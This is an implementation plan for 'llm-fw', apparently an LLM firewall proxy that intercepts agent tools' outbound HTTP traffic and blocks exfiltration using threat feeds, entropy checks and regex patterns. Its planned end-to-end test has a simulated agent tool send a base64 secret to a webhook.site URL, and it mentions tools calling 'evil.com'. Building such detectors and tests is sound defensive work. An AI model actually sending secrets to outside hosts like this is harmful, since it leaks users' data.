# Implementation Plan: HTTP Interception & URL Classification (PLAN-http.md)

This plan outlines the step-by-step implementation roadmap for extending `llm-fw` to intercept external HTTP/HTTPS connections and classify malicious ("bad") domains and exfiltration paths, as specified in [SPEC-http.md](../specs/SPEC-http.md).

---

## 🗺️ Implementation Phases

We will execute the implementation in **5 sequential phases** to ensure high performance, code isolation, and robust test coverage.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            DEVELOPMENT ROADMAP                              │
├─────────────────┬─────────────────┬─────────────────┬───────────────────────┤
│ Phase 1: Config │ Phase 2: Domain │ Phase 3: Proxy  │ Phase 4: Dashboard   │
│ & Data Schema   │ Classifiers     │ Interceptor     │ & E2E Testing         │
└─────────────────┴─────────────────┴─────────────────┴───────────────────────┘
```

---

## 📂 Component Map & New Files

Here are the files we will modify and create during the implementation:

```
llm-fw/
├── src/
│   ├── config/
│   │   └── config.ts         # [MODIFY] Add proxy.urlFilter and blacklist options
│   ├── proxy/
│   │   └── proxy.ts          # [MODIFY] Intercept CONNECT tunnels to unknown hosts
│   ├── detection/
│   │   ├── pipeline.ts       # [MODIFY] Orchestrate URL & domain check stages
│   │   ├── urlHeuristic.ts   # [NEW] Regex query parsers & entropy checks
│   │   └── urlBloomFilter.ts # [NEW] Bloom Filter lookup for threat feeds
│   └── dashboard/
│       └── server.ts         # [MODIFY] Render HTTP-blocked events & badges
├── scripts/
│   └── update-feeds.ts      # [NEW] Cron script to pull and compact threat feeds
├── PLAN-http.md              # [NEW] This implementation plan
└── SPEC-http.md              # [NEW] The technical specification
```

---

## 🛠️ Phase-by-Phase Roadmap

### Phase 1: Configuration & Threat Feed Infrastructure
Define the configurations and compile compact threat intelligence databases for local lookup.

1.  **Extend Configuration Schema**:
    Modify `src/types.ts` and `src/config/config.ts` to support the new `urlFilter` options:
    ```json
    {
      "proxy": {
        "urlFilterEnabled": true,
        "entropyThreshold": 4.8,
        "blocklistFeeds": ["abuse.ch", "phishing"],
        "whitelistDomains": ["api.anthropic.com", "github.com"]
      }
    }
    ```
2.  **Compact Bloom Filter Implementation**:
    Create `src/detection/urlBloomFilter.ts` implementing a fast, space-efficient **Bloom Filter** with a high-capacity hashing algorithm (MurmurHash3) to compress thousands of threat domains into a small binary block (< 500KB) for instant local $O(1)$ lookups.
3.  **Feed Compilation Script**:
    Create `scripts/update-feeds.ts` to:
    *   Download daily lists from PhishTank and URLhaus.
    *   Compile the active domains into our Bloom filter file at `data/threat-bloom.bin`.

---

### Phase 2: Domain & URL Classifiers
Create the scoring engines to evaluate hostnames and query string payloads.

1.  **Outbound URL Scorer**:
    Create `src/detection/urlHeuristic.ts` containing:
    *   **Shannon Entropy Calculator**: Checks characters of subdomains. If prefix entropy $> 4.8$ (min length $12$), flag as DNS tunnel exfiltration.
    *   **Exfiltration Pattern Regex**: Matches base64/hex blocks, common exfiltration keywords, and leak queries in URL paths and parameters.
2.  **White/Blocklist Evaluator**:
    Implement Domain checks:
    *   *Safe Pass*: Instant return if host matches `whitelistDomains` (e.g. `api.anthropic.com`).
    *   *Instant Block*: If host matches Bloom filter threats or matches known public request bins (e.g. `webhook.site`).

---

### Phase 3: Proxy Interception & Pipeline Integration
Hook the outbound checks into our proxy request loop.

1.  **Proxy Tunnel Interceptor**:
    In `src/proxy/proxy.ts`, when a `CONNECT` command is received:
    *   If the target host is **not** an LLM API target (e.g. a tool trying to call `evil.com`), intercept it.
    *   Run the new domain classifier. If blocked, terminate the tunnel immediately.
2.  **Decrypted Path Inspector**:
    For intercepted tunnels that are allowed (e.g., search tools calling `google.com`), decrypt the TLS payload and inspect the HTTP path/parameters.
    *   If a regex match or exfiltration payload is found, terminate the request with `403 Forbidden`.
3.  **Pipeline Integration**:
    Update the main orchestrator (`src/detection/pipeline.ts`) to transparently run URL checks alongside prompt checks.

---

### Phase 4: Dashboard & Event Reporting
Expose outbound URL exfiltration blocks in the dashboard GUI.

1.  **Dashboard Visual Badging**:
    Modify `src/dashboard/server.ts` to add styling and badges for URL exfiltration:
    *   Add a `.badge-url-block` style class (e.g., a modern purple theme `#7b1fa2`).
    *   Add columns in the Events table to display "Outbound Host" and "Query Parameters".
2.  **EventBus Logging**:
    Extend `BlockEvent` types to capture target URLs, blocked path strings, and exfiltration detection detail.

---

### Phase 5: Verification & E2E Testing
Ensure all classification components and socket termination flows operate perfectly.

1.  **Unit Tests**:
    *   `test/detection/urlBloomFilter.test.ts`: Verify Bloom filter compiles, hashes correctly, and has low false-positive rates.
    *   `test/detection/urlHeuristic.test.ts`: Test subdomain entropy checks on randomized subdomains and check exfiltration regex patterns.
2.  **E2E Proxy Tests**:
    *   Add a test case in `test/proxy/proxy.e2e.test.ts` where a simulated agent tool attempts to make an outbound HTTP GET request to `https://webhook.site/leak?data=base64_secret`.
    *   Confirm the proxy interceptor kills the request immediately, blocks with `403 Forbidden`, and logs a `"url-block"` event in the EventBus.
